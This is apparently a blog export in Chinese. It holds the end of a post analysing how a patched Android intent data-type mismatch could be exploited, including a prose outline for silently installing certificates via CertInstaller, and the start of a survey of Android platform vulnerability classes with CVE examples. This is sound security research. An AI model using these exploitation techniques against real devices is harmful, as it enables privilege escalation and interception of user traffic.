让手机直接拨打任意电话包括紧急电话来完成复现，来看看哪个 activity 处理这个 action：123456789101112131415161718192021222324252627282930313233&lt;!-- Works like CallActivity with CALL_PRIVILEGED instead of CALL intent. CALL_PRIVILEGED allows calls to emergency numbers unlike CALL which disallows it. Intent-sender must have the CALL_PRIVILEGED permission or the broadcast will not be processed. High priority of 1000 is used in all intent filters to prevent anything but the system from processing this intent (b/8871505). --&gt;&lt;activity-alias android:name=\"PrivilegedCallActivity\" android:targetActivity=\".components.UserCallActivity\" android:permission=\"android.permission.CALL_PRIVILEGED\" android:exported=\"true\" android:process=\":ui\"&gt; &lt;intent-filter android:priority=\"1000\"&gt; &lt;action android:name=\"android.intent.action.CALL_PRIVILEGED\"/&gt; &lt;category android:name=\"android.intent.category.DEFAULT\"/&gt; &lt;data android:scheme=\"tel\"/&gt; &lt;/intent-filter&gt; &lt;intent-filter android:priority=\"1000\" android:icon=\"@drawable/ic_launcher_sip_call\"&gt; &lt;action android:name=\"android.intent.action.CALL_PRIVILEGED\"/&gt; &lt;category android:name=\"android.intent.category.DEFAULT\"/&gt; &lt;data android:scheme=\"sip\"/&gt; &lt;/intent-filter&gt; &lt;intent-filter android:priority=\"1000\"&gt; &lt;action android:name=\"android.intent.action.CALL_PRIVILEGED\"/&gt; &lt;category android:name=\"android.intent.category.DEFAULT\"/&gt; &lt;data android:scheme=\"voicemail\"/&gt; &lt;/intent-filter&gt; &lt;intent-filter android:priority=\"1000\"&gt; &lt;action android:name=\"android.intent.action.CALL_PRIVILEGED\"/&gt; &lt;data android:mimeType=\"vnd.android.cursor.item/phone\"/&gt; &lt;data android:mimeType=\"vnd.android.cursor.item/phone_v2\"/&gt; &lt;data android:mimeType=\"vnd.android.cursor.item/person\"/&gt; &lt;/intent-filter&gt;&lt;/activity-alias&gt;这个 PrivilegedCallActivity 定义在 telecomm 里，其本身被 android.permission.CALL_PRIVILEGED 权限保护所以第三方应用无法调用，而且所有 intent filter 都有 data 标签！这不就是我们梦寐以求的受害组件吗？等等，先别半场开香槟！回过头仔细看看它定义的所有 intent filter，前三个强制规定了 scheme 所以我们带有 content URI 的 intent 是无法匹配的；最后一个只规定了 mimeType 没有规定 scheme，看起来完全可以利用，可以再把香槟打开了……吗？事实上，隐式 intent 是无法匹配到最后一个 intent filter 的。这是因为它没声明 android.intent.category.DEFAULT 这个 category。至于原因嘛，上面 UserCallActivity 的注释里写了，就是故意的：12345678&lt;!-- Omit default category below so that all Intents sent to this filter must be explicit. --&gt;&lt;intent-filter&gt; &lt;action android:name=\"android.intent.action.CALL\"/&gt; &lt;data android:mimeType=\"vnd.android.cursor.item/phone\"/&gt; &lt;data android:mimeType=\"vnd.android.cursor.item/phone_v2\"/&gt; &lt;data android:mimeType=\"vnd.android.cursor.item/person\"/&gt;&lt;/intent-filter&gt;摆明了就是歧视隐式 intent。得，你写的代码，你说了算。再次此路不通。尝试3：安装未知应用……什么是“未知应用”？回头看漏洞描述，里面提到了“bypass intent security check and install an unknown app”，正好启动 PackageInstaller 的私有 Activity 静默安装应用也是 launch anywhere 型漏洞常用的利用方法，那就再点开 PackageInstaller 看一眼。我们一般攻击 InstallInstalling 这个 activity 进行静默安装应用，对于静默卸载则使用 UninstallUninstalling，而很遗憾这两个 activity 都没有声明任何 intent filter。观察 PackageInstaller 的 AndroidManifest.xml，用漏洞唯一能进来的就是这个 InstallStart：12345678910111213141516171819202122232425&lt;activity android:name=\".InstallStart\" android:exported=\"true\" android:excludeFromRecents=\"true\"&gt; &lt;intent-filter android:priority=\"1\"&gt; &lt;action android:name=\"android.intent.action.VIEW\" /&gt; &lt;action android:name=\"android.intent.action.INSTALL_PACKAGE\" /&gt; &lt;category android:name=\"android.intent.category.DEFAULT\" /&gt; &lt;data android:scheme=\"content\" /&gt; &lt;data android:mimeType=\"application/vnd.android.package-archive\" /&gt; &lt;/intent-filter&gt; &lt;intent-filter android:priority=\"1\"&gt; &lt;action android:name=\"android.intent.action.INSTALL_PACKAGE\" /&gt; &lt;category android:name=\"android.intent.category.DEFAULT\" /&gt; &lt;data android:scheme=\"package\" /&gt; &lt;data android:scheme=\"content\" /&gt; &lt;/intent-filter&gt; &lt;intent-filter android:priority=\"1\"&gt; &lt;action android:name=\"android.content.pm.action.CONFIRM_INSTALL\" /&gt; &lt;category android:name=\"android.intent.category.DEFAULT\" /&gt; &lt;/intent-filter&gt; &lt;intent-filter android:priority=\"1\"&gt; &lt;action android:name=\"android.content.pm.action.CONFIRM_PRE_APPROVAL\" /&gt; &lt;category android:name=\"android.intent.category.DEFAULT\" /&gt; &lt;/intent-filter&gt;&lt;/activity&gt;这个 activity 完全没被保护，我们平常写代码请求安装应用或者在文件管理器里点 apk 安装的时候进来的就是这个 activity。而观察里面的代码，也没有诸如“调用者是可信系统应用就直接安装不进行确认”这种逻辑。那么漏洞作者有没有可能是攻击了应用市场的私有 activity？的确有这个可能，但是我简单扫了一眼 play store，也没找到能用的。这部分我没有完全反编译确认，只是简单看了一眼。欢迎勘误。突然间，我灵光一闪……漏洞描述为什么说“unknown app”而不是“arbitrary app without user interaction”？说明很可能根本就不是静默安装 app？这里简单介绍一下“未知来源”的概念：一个第三方不可信应用尝试安装其他 app 的时候需要用户手动先授权它安装未知 app，然后才能进入正常的安装确认页面。这个功能是在 PackageInstaller 中检测调用者然后判断它权限实现的。如果有办法让其他有权限的 app 帮忙启动 PackageInstaller，就能绕过这个限制。所以，漏洞作者很可能只是绕过了这个“未知来源”，而不是实现了静默安装！说实话，我分析到这里的时候自己都被无语住了，跟我玩文字游戏呢……后续我没有再去复现，从代码来看理论上是可行的，但是我个人觉得这种绕过的危害实在是低到可以忽略不计。感兴趣的读者可以自己试试。尝试4：静默安装证书我们常用的利用方法都不行，这里我提出一种新的方法：调用 CertInstaller 静默安装证书。其实很久之前就有人提出过这种利用思路，但是一直没什么热度，考虑到 Android 7.0 开始不再默认信任用户安装的证书，具体能造成什么危害也有些许疑问。不管怎么样，反正它能静默安装（先介绍一下 CertInstaller，我们的漏洞唯一能打到的就是这个叫 CertInstallerMain 的页面：1234567891011121314151617181920&lt;activity android:name=\".CertInstallerMain\" android:theme=\"@style/Transparent\" android:configChanges=\"orientation|keyboardHidden|screenSize\" android:exported=\"true\"&gt; &lt;intent-filter&gt; &lt;action android:name=\"android.credentials.INSTALL\"/&gt; &lt;category android:name=\"android.intent.category.DEFAULT\"/&gt; &lt;/intent-filter&gt; &lt;intent-filter&gt; &lt;action android:name=\"android.intent.action.VIEW\"/&gt; &lt;category android:name=\"android.intent.category.DEFAULT\"/&gt; &lt;data android:mimeType=\"application/x-x509-ca-cert\"/&gt; &lt;data android:mimeType=\"application/x-x509-user-cert\"/&gt; &lt;data android:mimeType=\"application/x-x509-server-cert\"/&gt; &lt;data android:mimeType=\"application/x-pkcs12\"/&gt; &lt;data android:mimeType=\"application/x-pem-file\"/&gt; &lt;data android:mimeType=\"application/pkix-cert\"/&gt; &lt;data android:mimeType=\"application/x-wifi-config\"/&gt; &lt;/intent-filter&gt;&lt;/activity&gt;很明显我们可以通过发送带有 action=android.intent.action.VIEW type=底下那一堆的 intent 触发它，而虽然这个 activity 没被保护，但是它里面兜兜转转其实最后会判断调用者，如果是 Settings 就直接无确认安装，否则显示个对话框要求你进 Settings 里手动安装。所以我们大概的思路就是，声明一个 activity 处理 VIEW 的 action + 一个随机 mime type，自己继承一下 FileProvider 然后重写 getType 在里面写个计数决定返回哪个 type，然后让系统帮我们启动 intent 即可。两个需要注意的点：1. intent 要带上一个 certificate_install_usage 的 extra 否则 CertInstaller 认不出证书类型；2. system uid 不允许发出不在白名单的 URI grant，所以在 intent 里添加 grant flags 并不能给 CertInstaller 授权读写自己的 provider。解决方法可以是直接把它声明成 exported（但是这样要改 FileProvider源码），我偷懒就直接硬编码调用 grantUriPermission() 给 CertInstaller 授权了。总结我个人觉得虽然这个洞能调起被保护的 activity，Google 也给出了高危评级，但条件实在太过苛刻（我自己是想不到会有多少 activity 又有 mimeType 又被保护），在 AOSP 中的影响不是很大，但是这个利用本身还是非常精巧的，需要对 Android 有很深的了解才能写出来。我一开始参考 Parcel Mismatch 把这种漏洞叫做“Intent Data Type Mismatch”，后面考虑“mismatch”这个英文单词可能更加强调的是“配对错了”的意思，而不是两次解析过程中因为其他因素造成的不一致，改成参考 Self-changing Bundle 这个名字命名为“Self-changing Data Type”。当然我不是漏洞发现者，没有命名权，这个命名看看就好。（所以你的 double reflection 无人问 别人一朝命名成 meta reflection 天下知怎么算……）AccountManager API 是 Android 2.0 也即 2009 年添加的，Launch Anywhere 漏洞已经是 2014 年爆出来的，完全没想到除了 bundle mismatch 十年之后还能爆出来这样一种优雅的利用方法，实在佩服。这个漏洞的原理还是比较简单的，就是一个类似 TOCTTOU race condition 的问题。除了直接拒绝 content uri 以外，还有一种修复思路是做完安全检查之后直接给 intent 设置上 component name 让它成为一个显式 intent，后续 startActivity() 时就不会再进入隐式 intent 的解析流程，两种方法都能阻止它指向的组件发生变化也就修复了漏洞。由于联系不到漏洞作者本人，所以以上文字纯属我的推理，没法和漏洞作者确认是否正确，也欢迎各位读者勘误。推理的过程本身其实也很过瘾，有点烧脑，有一种刑侦探案的感觉，在现场通过嫌疑人遗留的证据一点一点的抽丝剥茧还原案件真相。33iq 什么的跟这个比起来都弱爆了，建议把这个漏洞改编成剧本杀（不是2025 年 1 月 10 日更新：官方给出了这个漏洞的 test 代码，算是侧面印证了我的分析。","categories":[],"tags":[{"name":"android","slug":"android","permalink":"https://blog.canyie.top/tags/android/"},{"name":"system","slug":"system","permalink":"https://blog.canyie.top/tags/system/"},{"name":"安全","slug":"安全","permalink":"https://blog.canyie.top/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"Android 平台常见安全漏洞类型","slug":"android-platform-common-vulnerabilities","date":"2024-11-04T22:00:00.000Z","updated":"2025-05-15T11:13:01.210Z","comments":true,"path":"2024/11/05/android-platform-common-vulnerabilities/","link":"","permalink":"https://blog.canyie.top/2024/11/05/android-platform-common-vulnerabilities/","excerpt":"本文适用于已对 Android 开发有基础了解，希望了解 Android 系统层常见安全漏洞的人。祝大家写代码无 bug，挖洞天天挖到 Critical RCE 漏洞链。本文开始创作时间：2024-02-19 完成时间：2024-02-29 发布时间：2024-11-05","text":"本文适用于已对 Android 开发有基础了解，希望了解 Android 系统层常见安全漏洞的人。祝大家写代码无 bug，挖洞天天挖到 Critical RCE 漏洞链。本文开始创作时间：2024-02-19 完成时间：2024-02-29 发布时间：2024-11-05过年了，不要再讨论什么 CVE、CNVD、CNNVD 之类的了。你的漏洞们不能给你带来任何实质性作用，朋友们兜里掏出一大把钱吃喝玩乐，你默默的在家里打开你的 Test PLMN 。亲威朋友吃饭问你收获了什么，你说我的漏洞被谷歌评级高危了，Android 14 最新安全补丁都能用，亲戚们懵逼了，你还在心里默默嘲笑他们，笑他们不懂你的 BAL，不懂什么是 BG-FGS，不懂怎么利用 confused deputy 类型漏洞进行跨用户读取，不懂 LaunchAnywhere，不懂 PendingIntent 要 FLAG_IMMUTABLE，笑他们手机上的拼多多。你父母的同事都在说自己的子女一年的收获，儿子买了个房，女儿买了个车，姑娘升职加薪了，你的父母默默无言，说我的女儿天天在家里对着电脑上的一堆英文发呆，嘴里念叨谷歌怎么还不回我，有时候还给我们发一堆乱码的文件。权限，没有你我怎么活啊权限Android 权限机制概述权限肯定是每个 Android 开发者都用过的东西，比如应用要访问网络，就要像这样加上网络权限：1&lt;uses-permission android:name=\"android.permission.INTERNET\" /&gt;每个应用在被安装时都会被赋予一个 UID，包括系统应用。一般情况下，每个应用都会有一个独一无二的 UID，除非应用使用 sharedUserId 与其他应用共享 UID（这里忽略配置了 isolatedProcess=true 的服务进程，它们使用随机 UID 且几乎没有任何权限）。Android 系统内部也使用 UID 区分调用者。Android 中通过 getSystemService() 可以拿到一堆的 XxxManager，而几乎所有的这些 XxxManager 都会和 system_server 暴露出来的一个 XxxManagerService 进行交互。应用调用这些系统服务提供的接口时，如果需要权限，系统会首先校验权限。以接口 ConnectivityManager.getActiveNetwork() 为例，它需要 android.permission.ACCESS_NETWORK_STATE 这个权限，所以 ConnectivityService 就会主动校验这个权限：123456789101112private void enforceAccessPermission() &#123; mContext.enforceCallingOrSelfPermission( android.Manifest.permission.ACCESS_NETWORK_STATE, \"ConnectivityService\");&#125;@Override@Nullablepublic Network getActiveNetwork() &#123; enforceAccessPermission(); return getActiveNetworkForUidInternal(mDeps.getCallingUid(), false);&#125;这里的 enforceCallingOrSelfPermission 内部就会调用 Binder.getCallingUid() 拿到调用者的 UID 然后检查这个 UID 是否具有对应权限。所以实际上，鉴权用的是调用者 UID 而不是包名。权限还有一种特殊类型，叫做特殊权限，定义时在 protectionLevel 中加入 appop 的就是。特殊权限描述一组对系统有特殊意义的权限，如悬浮窗权限和修改系统设置权限。设置中有一个“特殊应用权限”的页面专门用来控制这些特殊权限。要检查这些特殊权限的授权状态需要用到 AppOpsManager。系统中还有很多别的安全机制，如 SELinux、capability 和 seccomp。这里略过不讲，感兴趣的可以自行搜索。想要以一个系统开发者的身份了解更多关于权限的知识，可以查看谷歌官方说明文档：Android permissions for system developers常见漏洞类型：主动鉴权不当CVE-2023-40094：鉴权缺失补丁链接：Require permission to unlock keyguard此种类型的漏洞可谓是最简单最经典的漏洞，对 Android 权限模型足够熟悉的人可能看一眼就能知道有问题，且漏洞危害性往往较高，如此例的 CVE-2023-40094，允许任意 app 调用特权 API 无密码解除锁屏，Google 也给出了高危评级。这种漏洞简单但可遇不可求，要在 AOSP 上百 GB 的源码仓库中发现未被适当保护的特权 API，可谓是大海捞针，捞到一个白嫖一个 CVE，偷着乐去。近几个月安全补丁中大概 1~3 个月就会有这种漏洞被公开，说明这种漏洞可能还存在不少，可能集中在新加的 API 和被重构过的服务中，还有各个 OEM 添加的自定义 API。CVE-2021-0554：鉴权在客户端补丁链接：Enforce BACKUP permission on Service end.Android 很多系统服务向应用暴露了自己的接口，允许应用调用。一般来说，应用这边使用的 API 叫 XxxManager，system_server 里会有一个对应的 XxxManagerService。应用这边的 XxxManager 基本上什么都不干，就只是调用 system_server 里的 XxxManagerService 而已，真正干活的是 XxxManagerService。发现了什么吗？以 ActivityManager 为例，虽然 ActivityManager 和 ActivityManagerService 都是系统的类，但是应用调用 API 的时候，ActivityManager 这个类里的代码是运行在调用者进程的，只有 ActivityManagerService 是在系统进程的！在调用者进程意味着调用者可以随便干扰，所以所有鉴权操作都应该放在系统进程里的 ActivityManagerService 以避免被干扰。而在这个漏洞中，代码刚好写反了，app 调用 BackupManager 的时候，BackupManager 在当前进程检查一遍权限，而BackupManagerService 中的接口却没有被保护。无论是利用反射、hook，或者直接调用 IBackupManager 都可以轻易绕过权限检查。这个其实和上一个没什么区别了，没有人这么写代码，近几年也没再看见过类似漏洞，参考价值不大，纯当乐子看就好。CVE-2015-6624 &amp; CVE-2015-6625：特殊接口 dumpCVE-2015-6624 补丁：Add DUMP permission check to ResourceManagerService.CVE-2015-6625 补丁：Add DUMP permission check to WifiScanner service.这两个漏洞本质上都还是接口缺权限校验，但漏洞点位于特殊接口 dump 内。dump 是 binder 内置的接口，很少被开发者注意到，仅用于在调试时（如 dumpsys 或 cmd xxx dump）输出信息。为了保护这些敏感数据，调用者应该具有 android.permission.DUMP 权限，而大部分接口也确实检查了权限，但仍然不排除有开发者失误的情况。识别这种漏洞可以尝试使用自动化工具，多设备批量对所有系统服务进行测试。不过现在 CTS 测试会确保没权限的时候调用 dump 任何服务都不会返回正确信息，所以应该也没什么挖掘价值。CVE-2020-0109：特殊接口 shellCommand补丁链接：Fix notification shell commands和上一条类似，不过这里是特殊接口 shellCommand，该接口用于 adb shell 命令行调试时调用 cmd xxx yyy。和上一条的 dump 相比，这一项更为复杂一点：Binder.java 中默认的 onShellCommand 实现会保证调用者 UID 为 root 或 shell，不满足直接拒绝，然后调用 handleShellCommand 实现具体操作，但 AOSP 中存在大量服务类直接重写了 onShellCommand 而非 handleShellCommand，使得这个校验被跳过；即使服务没有使用 handleShellCommand，如果 onShellCommand 内正确检查了调用者权限或调用者 UID，那也是安全的；即使未直接检查调用者权限，如果 ShellCommand 内调用的都是会检查权限的公开接口（且没有 clear calling id），那也可以认为安全。在这个漏洞中，部分操作未正确检查调用者权限，使得攻击者可以无权限调用系统内部私有接口造成漏洞。我发现的 CVE-2024-31318 就属于这种漏洞。这种漏洞近几年也不多见，了解一下就行。CVE-2021-0683：不正确的 ShellCommand 实现补丁链接：Fix side effects of trace-ipc and dumpheap commands本例中，ActivityManagerShellCommand 会在 ActivityManagerService.onShellCommand 中被调用，所以这里的代码运行在 system_server 进程，有着系统权限，直接调用 file.delete() 是以系统特权执行的，而很明显原本调用者不应该有删除系统文件的权限，造成漏洞。可能你会说，就算不删除文件，底下 system_server 一样要打开这个文件才能往里写入内容啊，这不是一样会覆盖原文件？请注意这里使用的是 openFileForSystem，这个函数实际上不会自己打开文件，而是使用调用者传递的 ShellCallback，让调用者进程打开文件然后返回文件描述符，所以实际上还是用调用者本身的权限。其他系统服务中，直接接受文件路径的接口（如 pm install /path/to/apk）也都应该这样实现，避免越权。CVE-2021-0327 &amp; CVE-2021-0398：一行 clearCallingIdentity 引发的惨案CVE-2021-0327 补丁：Ensure caller identity is restored in CP quick-path.CVE-2021-0398 补丁：Set mAllowWhileInUsePermissionInFgs correctly when bindService() from background.还记得上面提到的 Binder IPC 鉴权过程吗？enforceCallingOrSelfPermission 等 API 实际都是依赖 Binder.getCallingUid() 返回的调用者 UID 进行鉴权的，而另一个 API clearCallingIdentity 允许让 getCallingUid 返回自己的 UID，以此绕过部分权限检查。有时这种行为是有意且安全的，而有时则能造成安全漏洞。Android 发展十几年，API 之间的调用关系错综复杂，如果有一点没考虑到，就有可能造成漏洞。要发现这种漏洞，可以使用静态代码分析工具，但仍然需要人工一个一个筛选可用项，还是体力活。CVE-2015-6623：鉴权，但是手滑写错了补丁：Ask for system permission to enable ePNO太戏剧了一看就懂，应该不用多说……除了纯粹手滑，这种漏洞比较多的出现在大版本迭代行为变更时，改了一个但是没改完的情况，如 CVE-2015-3833，Android 5.0 废弃 getRecentsTask 方法，只在调用者拥有 android.permission.REAL_GET_TASKS 特权时才返回其他进程信息，但是 getRunningAppProcesses() 没任何权限检查，调用这个接口可以变相达成 getRecentsTask 的效果。CVE-2020-0107 &amp; CVE-2020-0246 &amp; CVE-2023-21092：调用者伪造 package nameCVE-2020-0107 补丁：Check UID in getUiccCardsInfoSecurityCVE-2020-0246 补丁：Add package checking with Uid in EuiccController#getEidCVE-2023-21092 补丁：Checking if package belongs to UID before registering broadcast receiver虽然大部分情况下鉴权只需要一条 enforceCallingOrSelfPermission，但有些时候仍然需要调用者的包名，而 Binder 默认只支持返回调用者的 UID 和 PID（PID 不可靠，调用者调用到一半被杀了，或者调用者指定 FLAG_ONEWAY 表示此次调用是异步调用时会是 0），因此遇上这种情况时，通常都是在参数中加一个 packageName 让调用者传递自己的包名。注意这里所谓的 packageName 是调用者主动传递所以完全受控于调用者，服务端必须检查传递的包名属于调用者 UID，而万一有一个地方粗心大意漏了，就有可能造成漏洞。实际上不只是 AOSP，OEM 代码中也出现过类似漏洞，如三星的 SVE-2021-23076 (CVE-2021-25510, CVE-2021-25511)。CVE-2021-0319：验证调用者包名，但是没完全验补丁：Fix CDM package check上回书说到，服务端必须保证调用者传入的包名属于调用者 UID，这种验证一般有三种方式，第一张是调用 AppOpsManager.checkPackage()，它在不匹配时会抛出 SecurityException；第二种是主动调用 PackageManager.getPackageUid() 与 calling uid 相比对，第三种是通过 isSameApp。初看漏洞代码：12345678private void checkCallerIsSystemOr(String pkg, int userId) throws RemoteException &#123; if (isCallerSystem()) &#123; return; &#125; checkArgument(getCallingUserId() == userId, \"Must be called by either same user or system\"); mAppOpsManager.checkPackage(Binder.getCallingUid(), pkg);&#125;用了上面提到的第一种方式，看起来好像并没有什么问题，对吧？我个人觉得即使是随便找一个安全研究员，跟他明确说这个文件里有校验包名不正确的漏洞，大概率也不会有人留意这里。其实关键点在这里：1private IAppOpsService mAppOpsManager;别被 mAppOpsManager 这个名字骗啦，它的类型不是 android.app.AppOpsManager，而是内部的 com.android.internal.app.IAppOpsService！虽然它们都有 checkPackage() 方法，但是前者在检查失败时会抛出异常，而后者只是返回错误而已！当初这段代码的作者应该也是觉得自己在用前者，结果实际上是后者，才造成漏洞。这种漏洞很少见，可以通过静态代码搜索找到所有对 IAppOpsService.checkPackage() 的调用然后一个个检查。鉴权虽好，可不要漏信息哦此类漏洞通常形式：攻击者传入其他应用的包名，然后通过微小的行为差异绕过 Android 11 中的“软件包可见性”（package visibility） 判断指定应用是否已经安装。例子1：CVE-2021-0321，getPackageUid 在对应包名不存在时会返回 Process.INVALID_UID，因此满足下面的 if 直接返回，调用者拿到空列表；而对应包名存在时，会调用 enforceCallingPermission(android.Manifest.permission.DUMP, function)，调用者收到 SecurityException。这个微小的行为差异造成了信息泄漏。例子2：CVE-2021-0975，包名存在时抛出的异常信息为 &quot;package &quot; + packageName + &quot; does not match caller&#39;s uid &quot; + uid 而不存在时是 &quot;package &quot; + packageName + &quot; not found&quot;，微小的信息差异造成信息泄漏。这种漏洞非常非常多，我简单搜索了一下，仅仅 Android 14 一个大版本中就修复了至少 37 个类似的漏洞，已被修复的类似漏洞预计已达上百个，可以想象 AOSP 中还有多少。此种漏洞谷歌一般评级仅为 Moderate，获得的赏金上限仅为 $250 且没有 CVE 编号，不值得专门去找，适合 code review 时顺手提交上去赚赏金。设备管理与多用户Android 从 4.2 开始加入了多用户功能，允许多个用户公用一台设备，每个用户可以安装各自的 app，数据互相隔离，一个用户通常情况下无法跨越用户边界读取或操作其他完全用户的数据（但管理员可以操作设备部分功能是否对其他用户开放）。跨用户操作通常需要 INTERACT_ACROSS_USERS INTERACT_ACROSS_USERS_FULL 等系统权限，如果有方法能绕过跨用户限制，就会被视为安全漏洞。部分关键系统应用可以只在主用户运行，其他用户访问到的只是主用户的实例。Android 同时支持设备管理。系统层提供 DevicePolicyManager 用于设备管理员控制设备，常用的有 lock task mode 可用于锁定设备或限制设备只能运行某几个应用（专用设备等用途，如自动售货机）和 User Restrictions 用于阻止用户操作特定设备功能，如禁用 WiFi、禁用蓝牙等。如果有方法绕过这些限制也会被视为安全漏洞。CVE-2019-2098 &amp; CVE-2021-0686：API 缺失跨用户检查上文提到，为了支持多用户，很多 API 的参数里都加上了一个 userId，而跨用户操作需要系统权限，这需要服务端主动鉴权，API 这么多总会有一两个漏掉的。另一种形式是要求调用者传入 UID，但调用者可以传入属于其他用户的 UID。下面两个漏洞就是很经典的漏跨用户检查。CVE-2019-2098 补丁：Add cross user permission check - areNotificationsEnabledForPackageCVE-2021-0686 补丁：Add cross-user check for getDefaultSmsPackage().CVE-2023-21107：组件缺失跨用户漏洞补丁：Enforce INTERACT_ACROSS_USERS_FULL permission for NotificationAccessDetails很多时候我们关注跨用户只关注系统提供的带有 userId 参数的 API，而忽略了系统应用。作为一个关键系统应用，系统设置拥有跨用户权限，此漏洞中的一个 Fragment 接收外部传递的 user handle 而没有任何输入校验和权限检查，然后直接开始使用这个 user handle，这样就使得攻击者可以利用一个低权限的恶意应用，打开 Settings 并传入其他用户的 handle，让高权限的 Settings 错误访问和操作其他用户的数据。这种“低权限个体欺骗高权限个体执行特权操作”的攻击模式被称为 confused deputy，虽然此例也可以说 missing permissions check 或者 missing input validation。事实上在编写这篇文章的过程中，我顺手搜了一下该漏洞中用到的 Intent.EXTRA_USER_HANDLE，然后就发现 Settings 中的另一个被称为 AppInfoBase 的 fragment 也存在一模一样的漏洞，喜提天上掉下来的高危漏洞 CVE-2024-43088。CVE-2023-21123：缺失 User Restrictions 检查漏洞补丁：Add DISALLOW_DEBUGGING_FEATURES checkDISALLOW_DEBUGGING_FEATURES 是一个 user restriction，可以由设备管理员设置以关闭调试相关的功能。Tracur 是一个系统内置的应用，和 trace 相关，而 trace 是调试功能。此例中，Tracur 没有检查 DISALLOW_DEBUGGING_FEATURES，虽然设置中开发者选项打不开，但是利用一个应用可以直接调起 Tracur 从而操作 trace。个人观察到的是 Android 12-13 刚发布的时候出现了很多这种 restriction bypass 的漏洞，可能是 Android 12 中将系统设置、SystemUI 等应用程序重构为新的 Material You 设计风格时进行了较大的代码改动所导致。笔者也曾经提交过类似漏洞，只获得了 Moderate 评级，摸不清 Google 心情。CVE-2021-0691：SELinux 权限配置不当上文说，Android 除了使用 UID 等 Linux 传统的 DAC 机制，还使用 SELinux 这一 MAC 机制进一步缩减进程权限，确保系统安全。而本节中提到的 CVE-2021-0691 就是 SELinux 权限配置过大导致。补丁链接：system_app: remove adb data loader permissions可以看见，原本的策略允许 system_app 写入 apk_data_file 即已安装应用的 apk 文件，可以覆盖其他应用的 dex/so 等文件进而向其他应用持久注入代码。虽然攻击只能由系统的 system_app 发起，这满足了 分级调节规则 中【需要作为特权上下文运行才能执行攻击】一条，严重程度被降为 moderate，但如果把这个漏洞和 system_app 中的其他漏洞如路径穿越写漏洞结合起来，就能组成一条非常有威力的漏洞链。事实上，此漏洞本身就是“魔形女”漏洞链的重要一环。想了解这一漏洞链可以参考这篇文章。历史上也出现过权限配置错误造成的严重程度更高的漏洞，通杀联发科设备的 MediaTek-SU 漏洞（CVE-2020-0069）就属于此类。虽然为了安全，Android 的 SELinux 中存在大量 neverallow 规则保证 OEM 不会添加太过离谱的规则，修改 neverallow 会导致无法通过 CTS，但我们确实发现有一些 OEM 确实允许了被 neverallow 的条目。只能对 OEM 质量一声叹息。组件与意图每个 Android 程序员都知道的 Android 四大组件：Activity Service BroadcastReceiver ContentProvider。Intent 则是与组件交互的桥梁。有时，不经意间的不当使用，也许就会造成漏洞。CVE-2021-0693：组件权限配置不当漏洞补丁：Don’t export HeapDumpProvider.组件的 exported 属性表示该组件是否可被外部应用访问，若没有设置则有 intent-filter 的组件默认导出（target Android 12+ 的 app 如果出现这种情况会被直接拒绝安装）。即使导出了组件，也可以设置 android:permission 等属性来限制只有拥有对应权限的应用才能访问此组件。本例中受害 provider 设置 exported=true 即导出，同时没有设置访问权限，任何应用都能直接访问，而访问 HeapDumpProvider 能获取到调试用的其他 app 的 heap dump，显然是敏感信息，从而造成非常明显的安全漏洞。这种漏洞前几年比较多，早期甚至出现过把 android:exported=&quot;true&quot; 误写成 exported=&quot;true&quot; 这种漏洞（CVE-2013-6272），随着系统的日益完善成熟，近几年观察到的少了。后续挖掘重点可以集中在 OEM 自定义的组件上。LaunchAnywhere：危险的 Intent Redirection大名鼎鼎的 LaunchAnywhere 应该是最早也最经典的 Intent Redirection 类型漏洞，可惜的是年代久远没有找到 CVE 编号，只有一个 Bug ID A-7699048。这个洞网上的详细分析已经有很多了，这里不赘述，只简单介绍一下它的基本原理：应用 A 通过 AccountManager API 添加账号时，AccountManagerService 会请求 account 的 authenticator（也是一个应用），而这个 authenticator 可能需要向用户显示一个界面，所以可能返回一个 intent，此时 AccountManagerService 把 intent 返回给 A，在 A 中运行的系统代码会直接调用 startActivity 启动这个 intent，这里用的是 A 的身份，从而可以无限制访问应用内部 Activity 组件。如果 A 是 Settings，它拥有系统权限，此时就可以访问所有应用的所有 Activity，无视它是否导出或是否被权限保护。Intent Redirection 是 Android 平台最经典的漏洞类型，已在 Android 系统、定制系统、三方应用程序等中多次出现过。其基本特征为收到别人发送的 intent，随后将其转发出去，常见 API 有 startActivity、sendBroadcast、setResult 等。前两个很明显，可以访问内部组件，而 setResult 虽然不能直接访问内部组件，但攻击者可以通过指定 intent 的 data 为应用内部受保护的 URI，并在 intent flags 中指定 FLAG_GRANT_READ/WRITE_URI_PERMISSION，当受害应用使用恶意 intent 调用 setResult() 时，就会不知不觉授予恶意应用读写自身内部 content provider 的权限。在 Android 12 中，为了规避这类问题，Strict mode 引入了新的功能，可以检测到应用收到（getParcelable）别人发来的 intent 并将其立即转发的情况，一定程度上帮助了开发者识别此类漏洞。但是，这个工具并不能扫描到所有危险，而且直接转发 intent 并不是 intent redirection 的唯一一种类型，CVE-2022-20550 &amp; CVE-2024-0015 就是一个例子，特权应用接收不可信的 ComponentName 然后直接创建指向该 ComponentName 的 intent 并 startActivity，也能够越权访问组件。补丁在这里：Fix vulnerability that allowed attackers to start arbitary activities。CVE-2014-8609（BroadcastAnywhere）：危险的 Pending Intent上文提到的 Intent 其实还漏了一种特殊形式，即 PendingIntent。简单来说，PendingIntent 由应用主动创建，代表某项特殊的操作，可以传送给别的应用，别的应用发送这个 PendingIntent 时就以 PendingIntent 创建者的身份发送。创建时可以指定 PendingIntent 是否可变，如果可变则允许发送者修改未被显式指定的 intent 字段，如 action、data、flags 等。为了安全起见，默认 selector 和 ComponentName 是不允许被修改的。回过头来看漏洞补丁：SECURITY: Don’t pass a usable Pending Intent to 3rd parties.很明显，这里的 mPendingIntent 创建时使用了一个空的、啥都没有的 intent，同时未指定 FLAG_IMMUTABLE（虽然实际原因是这玩意在 Android 6.0 才加，那个年代还没有这玩意），这使得攻击者拿到这个 PendingIntent 之后可以任意改写里面的 intent 再发送，同时由于这个 PendingIntent 是 Settings 创建的，具有系统权限，攻击者发送 PendingIntent 时会以创建者身份发送，也就同样是以系统权限。这里 PendingIntent 是用的 getBroadcast，最后 send 的时候也会以广播方式发送，比如攻击者改写 action 字段为 android.intent.action.MASTER_CLEAR，广播发送出去后就会触发 MasterClearReceiver 进行恢复出厂设置的操作。事实上，就算是开发者记得填充 action，有时候也不能避免漏洞的出现。恶意应用可以在自己的 AndroidManifest.xml 中注册相同 action 的 intent-filter，改写 package 指向恶意应用自己，flags 添加授权 flags，data/clipdata uri 指向受害应用私有的或者可访问的 ContentProvider 并发送，此时恶意应用就会被授予权限。更多可以查看 OPPO 